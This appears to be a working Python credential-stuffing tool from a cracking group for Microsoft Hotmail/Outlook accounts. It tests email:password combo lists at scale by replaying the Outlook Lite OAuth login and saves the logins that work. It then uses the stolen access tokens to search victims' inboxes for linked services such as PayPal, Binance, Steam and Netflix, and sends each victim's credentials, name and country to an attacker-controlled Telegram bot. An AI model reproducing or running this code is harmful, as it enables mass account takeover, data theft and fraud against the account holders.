#@CS_CRACKERS | @i606x 
import os , uuid , concurrent.futures
import tkinter as tk
from tkinter import filedialog
from dotenv import load_dotenv
try:
    import requests
    from rich.console import Console
    from rich.panel import Panel
except ImportError:
    import subprocess
    import sys
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'requests', 'rich'])
    from rich.console import Console
    from rich.panel import Panel
    

print("Success.")
load_dotenv()
a,b=0,0
Tok = os.getenv("TELEGRAM_BOT_TOKEN")
id = os.getenv("TELEGRAM_CHAT_ID")

class all:
    @staticmethod
    def get_infoo(Email,Password,token,CID) -> str:
        he = {
            "User-Agent": "Outlook-Android/2.0",
            "Pragma": "no-cache",
            "Accept": "application/json",
            "ForceSync": "false",
            "Authorization": f"Bearer {token}",
            "X-AnchorMailbox": f"CID:{CID}",
            "Host": "substrate.office.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip"}
        r = requests.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile",headers=he).json()
        info_name=(r.get('names', []))
        info_Loca=(r.get('accounts',[]))
        name=info_name[0]['displayName']
        Loca=info_Loca[0]['location']
        url = f"https://outlook.live.com/owa/{Email}/startupdata.ashx?app=Mini&n=0" 
        headers = {
            "Host": "outlook.live.com",
            "content-length": "0",
            "x-owa-sessionid": f"{CID}",
            "x-req-source": "Mini",
            "authorization": f"Bearer {token}",
            "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36",
            "action": "StartupData",
            "x-owa-correlationid": f"{CID}",
            "ms-cv": "YizxQK73vePSyVZZXVeNr+.3",
            "content-type": "application/json; charset=utf-8",
            "accept": "*/*",
            "origin": "https://outlook.live.com",
            "x-requested-with": "com.microsoft.outlooklite",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://outlook.live.com/",
            "accept-encoding": "gzip, deflate",
            "accept-language": "en-US,en;q=0.9"
        }
        rese = requests.post(url, headers=headers, data="").text
        V1 = '🎁  Facebook' if 'security@facebookmail.com' in rese else None
        V2 = '🎁  Instagram' if 'security@mail.instagram.com' in rese else None
        V3 = '🎁  Linkedin' if "messages-noreply@linkedin.com" in rese else None
        V4 = '🎁  Konami' if 'nintendo-noreply@ccg.nintendo.com' in rese else None
        V5 = '🎁  Tiktok' if 'register@account.tiktok.com' in rese else None
        V6 = '🎁  Twitter' if 'info@x.com' in rese else None
        V7 = '🎁  Paypal' if 'service@paypal.com.br' in rese else None
        V8 = '🎁  Binance' if 'do-not-reply@ses.binance.com' in rese else None
        V9 = '🎁  Netflix' if 'info@account.netflix.com' in rese else None
        V10 = '🎁  Playstation' if 'reply@txn-email.playstation.com' in rese else None
        V11 = '🎁  Supercell' if 'noreply@id.supercell.com' in rese else None
        i606x = '🎁  EpicGames' if 'help@acct.epicgames.com' in rese else None
        V13 = '🎁  Spotify' if 'no-reply@spotify.com' in rese else None
        V14 = '🎁  Rockstar' if 'noreply@rockstargames.com' in rese else None
        V15 = '🎁  Xbox' if 'xboxreps@engage.xbox.com' in rese else None
        V16 = '🎁  Microsoft' if 'account-security-noreply@accountprotection.microsoft.com' in rese else None
        V17 = '🎁  Steam' if 'noreply@steampowered.com' in rese else None
        V18 = '🎁  Roblox' if 'accounts@roblox.com' in rese else None
        V19 = '🎁  EA Sports' if 'EA@e.ea.com' in rese else None
        V20 = '🎁  X' if 'verify@x.com' in rese else None
        V21 = '🎁  𝗧𝘄𝗶𝘁𝘁𝗲𝗿' if 'verify@twitter.com' in rese else None
        V22 = '🎁  𝗧𝘄𝗶𝘁𝘁𝗲𝗿' if 'info@twitter.com' in rese else None
        V23 = '🎁  PayPal' if 'noreply@mail.paypal.com' in rese else None
        V24 = '🎁  SnapChat' if 'no_reply@snapchat.com' in rese else None
        V25 = '🎁  Discord' if 'noreply@discord.com' in rese else None
        V26 = '🎁  Valorant' if 'noreply@mail.accounts.riotgames.com' in rese else None
        V27 = '🎁  OnlyFans' if 'no-reply@onlyfans.com' in rese else None
        V28 = '🎁  Pornhub' if 'noreply@pornhub.com' in rese else None
        V29 = '🎁  Binance' if 'no-reply@binance.com' in rese else None
        V30 = '🎁  CallofDuty' if 'noreply@updates.activisio' in rese else None
        h = filter(None, [V1, V2, V3, V4, V5, V6, V7, V8, V9, V10, V11, i606x, V13, V14, V15, V16, V17, V18, V19, V20])
        hh = "\n".join(h)
        ff = f'''
<> [@CS_CRACKERS | @i606x] <>
Email : {Email}
Password : {Password}
Name : {name}
Country : {Loca}    
<> [ Linked Apps ] <>
{hh}
<> [@CS_CRACKERS | @i606x ] <>
'''
        requests.post(f"https://api.telegram.org/bot{Tok}/sendMessage?chat_id={id}&text={ff}")
    @staticmethod
    def get_token(Email,Password,cook,hh) -> str:
        Code = hh.get('Location').split('code=')[1].split('&')[0]
        CID = cook.get('MSPCID').upper()
        try:
            url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
            data = {"client_info": "1","client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
            "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
            "grant_type": "authorization_code",
            "code": Code,
            "scope": "profile openid offline_access https://outlook.office.com/M365.Access"}
            response = requests.post(url, data=data, headers={"Content-Type": "application/x-www-form-urlencoded"})
            token = response.json()["access_token"]
            all.get_infoo(Email,Password,token,CID)
        except Exception as e:''
        
    @staticmethod
    def login_protocol(Email,Password,URL,PPFT,AD,MSPRequ,uaid,RefreshTokenSso,MSPOK,OParams) -> str:
        global a,b  
        try:
            lenn = f"i13=1&login={Email}&loginfmt={Email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={Password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={PPFT}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
            Ln = len(lenn)
            headers = {
                "Host": "login.live.com",
                "Connection": "keep-alive",
                "Content-Length": str(Ln),
                "Cache-Control": "max-age=0",
                "Upgrade-Insecure-Requests": "1",
                "Origin": "https://login.live.com",
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "X-Requested-With": "com.microsoft.outlooklite",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1",
                "Sec-Fetch-Dest": "document",
                "Referer": f"{AD}haschrome=1",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.9",
                "Cookie": f"MSPRequ={MSPRequ};uaid={uaid}; RefreshTokenSso={RefreshTokenSso}; MSPOK={MSPOK}; OParams={OParams}; MicrosoftApplicationsTelemetryDeviceId={uuid}"}
            res = requests.post(URL,data=lenn,headers=headers,allow_redirects=False)            
            cook = res.cookies.get_dict()
            hh = res.headers
            if any(key in cook for key in ["JSH", "JSHP", "ANON", "WLSSC"]) or res.text == '':
                all.get_token(Email,Password,cook,hh)
                a += 1
                print(f'\033[2;32m{a} - Good : {Email} | {Password}')
                with open("good.txt", "a") as good_file:
                    good_file.write(f"{Email}:{Password}\n")

            else:
                b+=1
                print(f'\033[2;31m{b} - Bad : {Email} | {Password}')
        except Exception as e:''
    @staticmethod
    def get_values(Email,Password):
        headers = {
    #       "Host": "login.microsoftonline.com",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "return-client-request-id": "false",
            "client-request-id": "205740b4-7709-4500-a45b-b8e12f66c738",
            "x-ms-sso-ignore-sso": "1",
            "correlation-id": str(uuid.uuid4()),
            "x-client-ver": "1.1.0+9e54a0d1",
            "x-client-os": "28",
            "x-client-sku": "MSAL.xplat.android",
            "x-client-src-sku": "MSAL.xplat.android",
            "X-Requested-With": "com.microsoft.outlooklite",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9",
        }
        try:
            response = requests.get("https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint="+str(Email)+"&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D" ,headers=headers)
            cok = response.cookies.get_dict()
            URL = response.text.split("urlPost:'")[1].split("'")[0]
            PPFT = response.text.split('name="PPFT" id="i0327" value="')[1].split("',")[0]
            AD = response.url.split('haschrome=1')[0]
            MSPRequ = cok['MSPRequ']
            uaid = cok['uaid']
            RefreshTokenSso = cok['RefreshTokenSso']
            MSPOK = cok['MSPOK'],
            OParams =  cok['OParams']
            all.login_protocol(Email,Password,URL,PPFT,AD,MSPRequ,uaid,RefreshTokenSso,MSPOK,OParams)           
        except Exception as e:
            all.get_values(Email,Password)
    
    
    @staticmethod
    def fff():
        def select_file():
            root = tk.Tk()
            root.withdraw()  # hide main window
            file_path = filedialog.askopenfilename(title='Select Combo File')
            return file_path
        file = select_file()
        print(f"Selected file: {file}")

        executor = concurrent.futures.ThreadPoolExecutor(max_workers=50)
        with open(file, "r") as f:
             for line in f:
              try:
               if ':' in line:
                email = line.strip().split(':')[0]
                password = line.strip().split(':')[1]
                executor.submit(all.get_values,email,password)
               else:
                    pass
              except Exception as e:
                pass
                        
class One:
    @staticmethod
    def select_file():
            root = tk.Tk()
            root.withdraw()  # hide main window
            file_path = filedialog.askopenfilename(title='Select Combo File')
            return file_path
    @staticmethod
    def get_infoo(Email,Password,token,CID,app) -> str:
        global a,b
        print(app)
        he = {
            "User-Agent": "Outlook-Android/2.0",
            "Pragma": "no-cache",
            "Accept": "application/json",
            "ForceSync": "false",
            "Authorization": f"Bearer {token}",
            "X-AnchorMailbox": f"CID:{CID}",
            "Host": "substrate.office.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip"}
        r = requests.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile",headers=he).json()
        info_name=(r.get('names', []))
        info_Loca=(r.get('accounts',[]))
        name=info_name[0]['displayName']
        Loca=info_Loca[0]['location']
        url = f"https://outlook.live.com/owa/{Email}/startupdata.ashx?app=Mini&n=0" 
        headers = {
            "Host": "outlook.live.com",
            "content-length": "0",
            "x-owa-sessionid": f"{CID}",
            "x-req-source": "Mini",
            "authorization": f"Bearer {token}",
            "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36",
            "action": "StartupData",
            "x-owa-correlationid": f"{CID}",
            "ms-cv": "YizxQK73vePSyVZZXVeNr+.3",
            "content-type": "application/json; charset=utf-8",
            "accept": "*/*",
            "origin": "https://outlook.live.com",
            "x-requested-with": "com.microsoft.outlooklite",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://outlook.live.com/",
            "accept-encoding": "gzip, deflate",
            "accept-language": "en-US,en;q=0.9"
        }
        rese = requests.post(url, headers=headers, data="").text
        if str(app) in rese:
            a += 1
            print(f'\033[2;32m{a} - Good : {Email} | {Password}')
            with open("good.txt", "a") as good_file:
                good_file.write(f"{Email}:{Password}\n")
            ff = f'''
<> [ @i606x ] <>
Email : {Email}
Password : {Password}
Name : {name}
Country : {Loca}    
<> [ @i606x ] <>
'''
            requests.post(f"https://api.telegram.org/bot{Tok}/sendMessage?chat_id={id}&text={ff}")
        else:
            b+=1
            print(f'\033[1;33m{b} - Good Account but Not {app} : {Email} | {Password}')                     
    @staticmethod
    def get_token(Email,Password,cook,hh,app) -> str:
        Code = hh.get('Location').split('code=')[1].split('&')[0]
        CID = cook.get('MSPCID').upper()
        try:
            url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
            data = {"client_info": "1","client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
            "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
            "grant_type": "authorization_code",
            "code": Code,
            "scope": "profile openid offline_access https://outlook.office.com/M365.Access"}
            response = requests.post(url, data=data, headers={"Content-Type": "application/x-www-form-urlencoded"})
            token = response.json()["access_token"]
            One.get_infoo(Email,Password,token,CID,app)
        except Exception as e:''
        
    @staticmethod
    def login_protocol(Email,Password,URL,PPFT,AD,MSPRequ,uaid,RefreshTokenSso,MSPOK,OParams,app) -> str:
        global a,b  
        try:
            lenn = f"i13=1&login={Email}&loginfmt={Email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={Password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={PPFT}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
            Ln = len(lenn)
            headers = {
                "Host": "login.live.com",
                "Connection": "keep-alive",
                "Content-Length": str(Ln),
                "Cache-Control": "max-age=0",
                "Upgrade-Insecure-Requests": "1",
                "Origin": "https://login.live.com",
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "X-Requested-With": "com.microsoft.outlooklite",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1",
                "Sec-Fetch-Dest": "document",
                "Referer": f"{AD}haschrome=1",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.9",
                "Cookie": f"MSPRequ={MSPRequ};uaid={uaid}; RefreshTokenSso={RefreshTokenSso}; MSPOK={MSPOK}; OParams={OParams}; MicrosoftApplicationsTelemetryDeviceId={uuid}"}
            res = requests.post(URL,data=lenn,headers=headers,allow_redirects=False)            
            cook = res.cookies.get_dict()
            hh = res.headers
            if any(key in cook for key in ["JSH", "JSHP", "ANON", "WLSSC"]) or res.text == '':
                One.get_token(Email,Password,cook,hh,app)
            else:
                b+=1
                print(f'\033[2;31m{b} - Bad Account : {Email} | {Password}')
        except Exception as e:''
    @staticmethod
    def get_values(Email,Password,app):
        headers = {
    #       "Host": "login.microsoftonline.com",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "return-client-request-id": "false",
            "client-request-id": "205740b4-7709-4500-a45b-b8e12f66c738",
            "x-ms-sso-ignore-sso": "1",
            "correlation-id": str(uuid.uuid4()),
            "x-client-ver": "1.1.0+9e54a0d1",
            "x-client-os": "28",
            "x-client-sku": "MSAL.xplat.android",
            "x-client-src-sku": "MSAL.xplat.android",
            "X-Requested-With": "com.microsoft.outlooklite",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9",
        }
        try:
            response = requests.get("https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint="+str(Email)+"&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D" ,headers=headers)
            cok = response.cookies.get_dict()
            URL = response.text.split("urlPost:'")[1].split("'")[0]
            PPFT = response.text.split('name="PPFT" id="i0327" value="')[1].split("',")[0]
            AD = response.url.split('haschrome=1')[0]
            MSPRequ = cok['MSPRequ']
            uaid = cok['uaid']
            RefreshTokenSso = cok['RefreshTokenSso']
            MSPOK = cok['MSPOK'],
            OParams =  cok['OParams']
            One.login_protocol(Email,Password,URL,PPFT,AD,MSPRequ,uaid,RefreshTokenSso,MSPOK,OParams,app)   
        except Exception as e:
            One.get_values(Email,Password,app)@staticmethod
    
    @staticmethod
    def fff():
        def select_file():
            root = tk.Tk()
            root.withdraw()  # hide main window
            file_path = filedialog.askopenfilename(title='Select Combo File')
            return file_path
        emails = {
        1: 'security@facebookmail.com',
        2: 'security@mail.instagram.com',
        3: 'messages-noreply@linkedin.com',
        4: 'nintendo-noreply@ccg.nintendo.com',
        5: 'register@account.tiktok.com',
        6: 'verify@x.com',
        7: 'service@paypal.com.br',
        8: 'do-not-reply@ses.binance.com',
        9: 'info@account.netflix.com',
        10: 'reply@txn-email.playstation.com',
        11: 'noreply@id.supercell.com',
        12: 'help@acct.epicgames.com',
        13: 'no-reply@spotify.com',
        14: 'noreply@rockstargames.com',
        15: 'xboxreps@engage.xbox.com',
        16: 'account-security-noreply@accountprotection.microsoft.com',
        17: 'noreply@steampowered.com',
        18: 'accounts@roblox.com',
        19: 'EA@e.ea.com',
        20: 'no-reply@bitkub.com',
        21: 'noreply@mail.paypal.com',
        22: 'no_reply@snapchat.com',
        23: 'noreply@discord.com',
        24: 'noreply@mail.accounts.riotgames.com',
        25: 'noreply@updates.activision',
        26: 'no-reply@onlyfans.com',
        27: 'noreply@pornhub.com'
    }
    
        apps = [
        "Facebook", "Instagram", "Linkedin", "Konami", "Tiktok", "X", "Paypal", "Binance",
        "Netflix", "Playstation", "Supercell", "Epicgames", "Spotify", "Rockstar", "Xbox",
        "Microsoft", "Steam", "Roblox", "EaSports", "Bitkub", "PayPal", "Snapchat", "Discord", "Valorant", "CallofDuty", "OnlyFans", "Pornhub", 
    ]  
        for app in enumerate(apps, start=1):
            print(app)
        ap = int(input('\n\nTarget app : '))
        aap = emails[ap]
        os.system('cls' if os.name == 'nt' else 'clear')     
        file = select_file()
        print(f"Selected file: {file}")
        executor = concurrent.futures.ThreadPoolExecutor(max_workers=50)
        with open(file, "r") as f:
            for line in f:
                try:
                    if ':' in line:
                        email = line.strip().split(':')[0]
                        password = line.strip().split(':')[1]
                        executor.submit(One.get_values, email, password, aap)
                    else:pass
                except Exception as e:pass

if __name__=='__main__':
    console = Console()
    os.system('cls' if os.name == 'nt' else 'clear')
    P = Panel('[bold yellow] Lets Check Some Hotmails \n\n[bold bright_red]1 - inbox (AIO) All applications\n\n2 - inbox One applications[/bold bright_red]\n', border_style="bright_green")
    console.print(P)    
    i606x = input('\nSelect : ')
    os.system('cls' if os.name == 'nt' else 'clear')
    if i606x == '1':
        all.fff()
    elif i606x == '2':
        One.fff()
    else:
        print('Not ❌')